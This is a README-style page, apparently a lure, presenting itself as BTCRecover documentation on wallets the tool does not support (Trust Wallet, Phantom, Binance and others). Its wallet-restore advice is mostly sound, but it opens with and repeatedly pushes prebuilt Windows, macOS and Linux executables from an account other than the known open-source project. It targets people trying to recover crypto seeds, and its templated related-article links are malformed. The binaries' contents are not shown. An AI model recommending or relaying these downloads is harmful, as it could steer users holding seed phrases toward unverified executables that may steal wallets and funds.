<div align="center">
<img src="assets/banner-article.png" alt="Wallets and files BTCRecover does not target">
</div>

# Wallets and files BTCRecover does not target

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

BTCRecover works on local wallet files and seed phrases of the formats it supports, not on every wallet that exists. Trust Wallet, Phantom, Ronin, Coinbase Wallet, Binance, Pi, Enjin, Tonkeeper and Ari are outside that set, and the honest answer for each is the wallet's own restore flow rather than a search.

## You'll see this if

You searched for a wallet by name, landed here, and want to know whether there is a route at all. There is  -  just not through this tool, and pretending otherwise wastes the most valuable thing you have, which is the phrase.

| Wallet | Why it is not a target | What actually recovers it |
|---|---|---|
| Trust Wallet | a mobile app with its own encrypted vault and seed scheme | the app's own phrase restore, in the same app |
| Phantom | a Solana wallet with a different key scheme and derivation | Phantom's phrase restore, on any device |
| Ronin | its own wallet format and account model | the Ronin wallet's phrase restore |
| Coinbase Wallet (self-custody) | an extension and mobile vault, not a local file the tool reads | the wallet's phrase restore |
| Coinbase account (custodial) | keys are held by the provider | the provider's account recovery |
| Binance | an exchange account, and a separate app wallet | the provider's account recovery |
| Pi | a wallet tied to its own app and passphrase model | the Pi app's own recovery |
| Enjin | its own wallet format | the Enjin wallet's phrase restore |
| Tonkeeper | a TON wallet with its own seed handling | Tonkeeper's phrase restore |
| Ari | a wallet with its own local storage format | the wallet's own restore or its provider |

## Why it happens

Support is a property of file formats and seed schemes, not of brand names. A recovery tool has to parse an encrypted file or derive keys from a specific phrase format; where a wallet stores its keys in a shape the tool does not read, no amount of searching helps, because there is nothing to read.

Mobile-first wallets make this worse by hiding their storage. There is no user-visible file and no documented path, so a recovery tool has no artifact to work from  -  the seed inside the app is the only interface, and the app is the only thing that can use it.

Custodial accounts are a different category altogether. When an exchange holds the keys, there is no seed to recover and no file to search; the balance is a database entry and the only route is the provider's own account process. Confusing a custodial account with a self-custody wallet is the single most common reason people search for a tool that cannot help.

## Fix

**Install the current release first.** Download and run [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1) from the releases page; the steps below assume that build.

Use the wallet's own restore, and treat the phrase as the thing to protect rather than the thing to search.

1. **Identify whether you hold keys at all.** If the balance sits in an exchange account, stop: the provider's recovery is the route, and no local tool applies.
2. **Install the same wallet family on a clean device** and choose restore rather than create. The phrase is the interface, whatever the app looks like.
3. **Enter the phrase in the app that produced it** where possible. Cross-wallet restores work when the schemes match and silently show an empty wallet when they do not.
4. **Compare the first address**, not the balance, to confirm the restore worked: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md).
5. **If the phrase is incomplete**, a local search may still be possible when the wallet's format is one the tool reads. If it is not, only the app's own recovery applies: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).
6. **Never install a "recovery" tool that asks for a phrase.** This is the exact shape of the most common theft in this space: [You shared your seed phrase: what is recoverable](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-shared-seed-phrase.md).
7. **Archive the outcome.** Record the wallet, the address and the phrase location so the next incident is shorter.

One practical alternative exists for a wallet outside this list: check whether the app can export a standard backup. Several wallets offer an export of the seed in a recognised format, or an export of individual private keys, and a standard export turns an unsupported wallet into a supported artifact  -  one the tool can then read. Where no export exists, the app's own restore is the only route, and no third-party tool changes that, whatever a search result claims.

## If that did not work

If the app's own restore shows nothing, the phrase and the account differ rather than the wallet being unsupported.

Check the phrase length and word list against the app's expectations, and check that you are restoring the same account the app created. Wallets on other chains use different derivation schemes, so a phrase from a Bitcoin wallet will not restore a Solana account, and the reverse is equally true. Where the wallet is gone and its scheme is undocumented, the honest position is that the phrase may be readable only by that wallet family  -  and if no copy of the phrase exists, nothing recovers the balance: [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md).

One practical hint before giving up on identification: the app's own export or backup file, if one exists, names the format. That name is what decides whether any local tool can work with it: [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md).

## Prevention

- Prefer wallets whose backup is a standard phrase you can restore elsewhere.
- Write the phrase down at creation and test a restore before funding: [Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md).
- Keep the wallet name and version with the backup.
- Verify any download against the project's own release page before installing: [Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md).
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Can I recover my Trust Wallet without the seed phrase?

No. A self-custody wallet has no server-side copy of the keys, so the phrase is the only route back. Without it, the wallet's balance is unreachable by any tool, including this one.

### Does BTCRecover support Trust Wallet, Phantom or Ronin?

No, and the tool will not pretend to. Support is limited to local wallet files and seed formats it can read; mobile-first wallets outside that set need their own app's restore.

### My wallet is not on the list. Can it still work?

Only if the wallet produces a local file or phrase in a format the tool reads. A file extension is not enough: the encrypted structure has to be one the tool understands, which is why identification comes first.

### Can I import an unsupported wallet into a supported one?

Only if it can export something standard  -  a recognised seed format or individual private keys. Importing an app's internal vault into another app is not a supported operation, and no conversion tool makes it one.

### Is an exchange balance recoverable with a recovery tool?

No. An exchange holds the keys, so the balance is an account entry rather than a wallet you control. Account recovery belongs to the provider, and no seed-based tool can reach it.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [Can lost Bitcoin be recovered?]([Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md))
- [You shared your seed phrase]([You shared your seed phrase: what is recoverable](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-shared-seed-phrase.md))
- [You forgot which wallet software you used]([You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md))
